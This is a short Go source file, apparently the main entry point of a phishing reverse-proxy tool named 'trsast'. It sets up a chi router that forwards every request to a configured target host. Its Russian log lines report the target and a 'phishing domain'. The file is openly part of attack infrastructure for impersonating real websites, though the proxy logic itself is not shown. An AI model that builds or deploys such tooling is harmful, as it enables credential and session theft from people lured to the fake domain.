package main

import (
    "log"
    "net/http"

    "trsast/config"
    "trsast/proxy"

    "github.com/go-chi/chi/v5"
    "github.com/go-chi/chi/v5/middleware"
)

func main() {
    cfg := config.Load()

    proxyHandler, err := proxy.NewProxyHandler(cfg)
    if err != nil {
        log.Fatalf("Не смог поднять прокси: %v", err)
    }

    r := chi.NewRouter()
    r.Use(middleware.Logger)
    r.Use(middleware.Recoverer)
    r.Use(middleware.RealIP)

    // Все запросы идут через прокси
    r.Handle("/*", proxyHandler)

    log.Printf("Прокси запущен на порту %s", cfg.Port)
    log.Printf("Цель: %s://%s", cfg.TargetScheme, cfg.TargetHost)
    log.Printf("Фишинг-домен: %s", cfg.PhishDomain)
    log.Fatal(http.ListenAndServe(":"+cfg.Port, r))
}

